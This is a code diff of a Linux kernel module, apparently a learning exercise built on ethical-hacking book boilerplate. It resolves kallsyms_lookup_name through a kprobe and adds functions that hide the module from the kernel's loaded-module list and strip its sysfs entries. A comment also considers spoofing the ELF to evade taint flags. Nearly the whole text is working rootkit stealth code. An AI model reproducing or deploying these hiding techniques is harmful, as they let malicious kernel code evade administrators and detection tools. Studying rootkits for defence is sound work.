@@ -1,75 +1,110 @@
-/*
- * Exposed symbol boilerplate and makefile from: Daniel Graham
- * Ethical Hacking - A Hands-On Introduction to Breaking In
- *
- * https://docs.kernel.org/trace/kprobes.html
- */ 
-
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/kallsyms.h>
 #include <linux/kprobes.h>
+#include <linux/list.h>
+#include <linux/slab.h>
 
-#define PROC_FAIL 1;
+#define MOD_SUCCESS 0
+#define MOD_FAIL -1
 
-int lookup_prehandler(struct kprobe *probe, struct pt_regs *regs) {
-	printk(KERN_NOTICE "Attempting kprobe address dump...");
-	return 0;
-}
+static bool hidden = false;
+static struct mutex *mod_mutex;
+struct list_head *other_modules;
 
 typedef unsigned long (*pt_kallsyms_lookup_name)(const char *);
 
 unsigned long find_ksymbol(const char *name) {
-/*
- * These preprocessor macros are kinda cool,
- * but they don't seem scalable. This works...
- * for now.
- */
-#ifdef kallsyms_lookup_name
-	printk("Found exposed symbol kallsyms_lookup_name.");
-	return kallsyms_lookup_name(name);
-#endif
 #ifdef CONFIG_KPROBES
 	pt_kallsyms_lookup_name lookup;
-
 	struct kprobe probe = {
 		.symbol_name = "kallsyms_lookup_name",
-		.pre_handler = lookup_prehandler,
 	};
-	
-	if (register_kprobe(&probe) != 0) {
+
+	if (register_kprobe(&probe) != MOD_SUCCESS) {
 		printk(KERN_ERR "Registering kallsyms probe failed.");
-		return -PROC_FAIL;
+		return MOD_FAIL;
 	}
 
 	lookup = (pt_kallsyms_lookup_name) probe.addr;
 	unregister_kprobe(&probe);
-	printk(KERN_NOTICE "Got kallsyms_lookup_name address: %lu.",
-		(unsigned long) lookup);
 
+	// kallsyms_lookup_name returns 0 when not found
 	return lookup(name);
 #endif
-	// TODO: add linear address search from through exposed symbols?
-	// Add some functionality if kprobes aren't available
-	return -PROC_FAIL;
+	return MOD_FAIL;
 }
 
-// TODO: should cache the table address somehow when we start using it
-// to grab syscalls
-
-static int startup(void) {
-	unsigned long sys_call_table_addr;
-	sys_call_table_addr = find_ksymbol("sys_call_table");
-	if (sys_call_table_addr <= 0) {
-		printk(KERN_ERR "Could not find symbol.");
-	} else {
-		printk(KERN_NOTICE "Dumped call table at: %lu.\n",
-			(unsigned long) sys_call_table_addr);
+static int reveal_self(void) {
+	if (!hidden) {
+		printk(KERN_NOTICE "Module is not hidden.\n");
+		return MOD_FAIL;
 	}
-	return 0;
+
+	while (!mutex_trylock(mod_mutex)) {
+		cpu_relax();
+	}
+	list_add(&THIS_MODULE->list, other_modules);
+
+	mutex_unlock(mod_mutex);
+	hidden = false;
+
+	printk(KERN_NOTICE "Module revealed.\n");
+	return MOD_SUCCESS;
 }
 
-static void shutdown(void) {
+static int hide_self(void) {
+	mod_mutex = (struct mutex *)find_ksymbol("module_mutex");
+
+	if (!mod_mutex) {
+		printk(KERN_NOTICE "Couldn't find mutex.");
+		return MOD_FAIL;
+	}
+	printk(KERN_NOTICE "Dumped mutex addr: %lu\n.",
+			(unsigned long) mod_mutex);
+
+	while (!mutex_trylock(mod_mutex)) {
+		cpu_relax();
+	}
+
+	other_modules = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list); 
+
+	/*
+	 * Free sysfs metadata
+	 *
+	 * Freeing the notes_attrs causes a crash.
+	 * notes_attrs is populated at load time
+	 * by the kernel, maybe we can mutate it
+	 * to be sneakier - data here used in sysfs
+	 * entries
+	 */
+	kfree(THIS_MODULE->sect_attrs);
+	THIS_MODULE->sect_attrs = NULL;
+	mutex_unlock(mod_mutex);
+
+	hidden = true;
+	printk(KERN_NOTICE "Module hidden.\n");
+	return MOD_SUCCESS;
+}
+
+/*
+ * Not sure to what extent this can be handled, but currently
+ * upon loading we hit some code in module/main.c that
+ * marks this module tainted/out of tree. It looks like it
+ * checks the elf... I wonder if there is a way to spoof
+ * the elf that this module will use.
+ * 
+ * static void handle_taint_flags(void) {}
+ */ 
+
+static int __init startup(void) {
+	if (hide_self() == 0) {}
+	if (reveal_self() == 0) {}
+	return MOD_SUCCESS;
+}
+
+static void __exit shutdown(void) {
 	printk(KERN_NOTICE "Closing...\n");
 }
 
